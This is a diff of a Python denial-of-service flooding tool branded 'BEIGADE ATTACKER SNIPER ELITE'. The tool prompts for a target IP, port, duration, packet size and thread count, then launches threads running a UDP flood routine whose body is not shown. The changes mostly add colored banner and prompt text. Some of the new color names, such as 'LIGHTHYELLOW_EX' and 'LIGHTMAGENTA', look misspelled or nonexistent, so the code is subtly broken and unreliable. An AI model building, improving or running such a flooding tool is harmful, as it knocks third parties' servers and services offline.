@@ -9,31 +9,30 @@ import random
 # Clear terminal screen
 os.system('clear')
 
-# Function to display banner
-def display_banner():
-    banner = Colored("""
-:::::::::::|                                              / ::
-———— ::————/     ___   ____    ____   ___   ____          | ::
-    | ;:\ ::    / ::|/:::::\  /:::::\ | ::: | ::          | ::
-    | :: \ :: :: :: / :: | ::/ :: | ::| :: :: ::  _____   | ::
-    | ::  \ ::  ::  | :::::/ | :::::/ | :: \ :::  |_::::| | :::::::
-     \__   \__/\__   \_____/  \_____/ |___  \___          \________
-||###################################################################||
-||_________[[ BEIGADE ATTACKER SNIPER ELITE  ** By:Kun99 ]]__________||
-||_________[[                                            ]]__________||
-#####################################################################||
- """
-    print(banner)
+#DATA
+banner = f"""
+{Fore.YELLOW}|:::::::::::|                                             / ::
+{Fore.YELLOW}———— ::————/     ___   ____    ____   ___   ____         | ::
+{Fore.WHITE}| ;:\ ::    / ::|/:::::\  /:::::\ | ::: | ::          | ::
+{Fore.WHITE}| :: \ :: :: :: / :: | ::/ :: | ::| :: :: ::  _____   | ::
+{Fore.WHITE}| ::  \ ::  ::  | :::::/ | :::::/ | :: \ :::  |::::|  | ::::::
+{Fore.LIGHTYELLOW_EX}\__   \__/\__   \_____/  \_____/ |___  \___          \________
+                                                               
+{Fore.RED}||_________[[ BEIGADE ATTACKER SNIPER ELITE  ** By:Kun99 ]]__________||
+{Fore.RESET}"""
+ 
+print(banner)
+host = ""
+ip = ""
 
-# Prompt user for input
 def get_user_input():
     print(" +======================================================+")
-    target_ip = input(" | Target IP : ").strip()
-    target_port = input(" | Target Port : ").strip()
-    attack_time = input(" | Time (seconds) : ").strip()
-    packet = input(" | Packet : ").strip()
-    thread_count = input(" | Thread : ").strip()
-    method = input(" | Method (UDP/TCP & UDP Mix) : ").strip().lower()
+    target_ip = input(f"{Fore.LIGHTHYELLOW_EX} | Target IP : ").strip()
+    target_port = input(f"{Fore.YELLOW} | Target Port : ").strip()
+    attack_time = input(f"{Fore.RED} | Time (seconds) : ").strip()
+    packet = input(f"{Fore.LIGHTGREEN_EX} | Packet : ").strip()
+    thread_count = input(f"{Fore.LIGHTCYAN_EX} | Thread : ").strip()
+    method = input(f"{Fore.CYAN} | Method (UDP/TCP & UDP Mix) : ").strip().lower()
     print(" ========================================================")
 
     return target_ip, int(target_port), int(attack_time), int(packet), int(thread_count), method
@@ -73,7 +72,7 @@ def start_attack(target_ip, target_port, packet, thread_count, method, duration)
             th = threading.Thread(target=udp_attack, args=(target_ip, target_port, packet, duration, thread_count))
             th.start()
     else:
-        print("[SNIPER-ELITE] Unsupported method. Only UDP supported in this version.")
+        print(f"{Fore.MAGENTA}[SNIPER-ELITE] Unsupported method. Only UDP supported in this version.{Fore.LIGHTMAGENTA}{Fore.RESET}")
 
 # Main program flow
 def main():
